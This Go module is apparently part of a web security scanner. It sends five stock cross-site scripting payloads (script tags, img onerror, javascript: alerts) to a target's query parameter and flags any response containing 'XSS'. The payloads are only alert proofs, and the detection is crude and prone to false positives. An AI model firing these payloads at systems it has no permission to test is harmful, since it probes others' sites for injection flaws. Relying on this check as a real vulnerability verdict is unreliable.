package modules

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func XSS(url string) {
	payloads := []string{
		"<script>alert('XSS')</script>",
		"<img src=\"javascript:alert('XSS');\">",
		"'><script>alert('XSS');</script>",
		"\";alert('XSS');",
		"'><img src=x onerror=alert('XSS');>",
	}

	for _, payload := range payloads {
		// Making the URL with the payload
		testURL := fmt.Sprintf("%s/vulnerable-endpoint?param=%s", url, payload)

		// Sending a GET req
		response, err := http.Get(testURL)
		if err != nil {
			fmt.Println("Error sending GET request:", err)
			return
		}
		defer response.Body.Close()

		// Read the response body
		body, err := ioutil.ReadAll(response.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		// Check if the response contains a known XSS indicator
		if strings.Contains(string(body), "XSS") {
			fmt.Printf("Potential XSS threat detected with payload: %s\n", payload)
		} else {
			fmt.Printf("No XSS threat detected with payload: %s\n", payload)
		}
	}
}
